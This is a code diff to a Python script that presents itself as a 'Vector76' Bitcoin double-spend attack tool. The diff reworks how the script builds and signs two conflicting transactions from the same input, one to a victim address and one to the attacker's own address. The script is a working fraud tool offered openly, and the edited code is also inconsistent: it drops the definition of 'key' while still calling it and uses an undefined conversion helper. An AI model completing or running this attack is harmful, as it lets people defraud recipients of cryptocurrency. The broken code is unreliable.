@@ -10,7 +10,8 @@ from hashlib import sha256
 #from bitcoincli import Bitcoin
 #from bitcoinaddress import Wallet
 from bit import Key
-#from bitcoin_tools.core.transaction import TX
+from bitcoin_tools.core.transactions import TX
+from bitcoin_tools.core.keys import load_keys
 
 parser = argparse.ArgumentParser(description="How To Use vector76")
 parser.add_argument("node_host",
@@ -160,16 +161,19 @@ print("--------------------")
 print("[+] READY...")
 input(" --- Press the enter key to continue the Vector76 attack... --- ")
 #print(amount_satoshi)
-#fee_satoshi = 1500
-print("push T1")
-key = Key(key)
+fee_satoshi = 1500
+print("sign T1")
+sk, pk = load_keys(attacker_address)
 #bitcoin.add_privkeys(key)
-#send_amount = amount_satoshi - fee_satoshi
-tx_victim = [(victim_address, amount_BTC, "btc")]
-print(key.send(tx_victim))
+amount_satoshi = to_satoshi(amount_BTC)
+send_amount = amount_satoshi - fee_satoshi
+tx_victim = TX.build_from_io(prev_txid, 0, send_amount, victim_address)
+tx_victim = tx_victim.sign(sk, 0).serialize()
+print(tx_victim)
 
-print("push T2")
-tx_attacker = [(attacker_address, amount_BTC, "btc")]
+print("sign T2")
+tx_attacker = TX.build_from_io(prev_txid, 0, send_amount, attacker_address)
+tx_attacker = tx_attacker.sign(sk, 0).serialize()
 print(key.send(tx_attacker))
 print()
 print("Request Blockheader...")
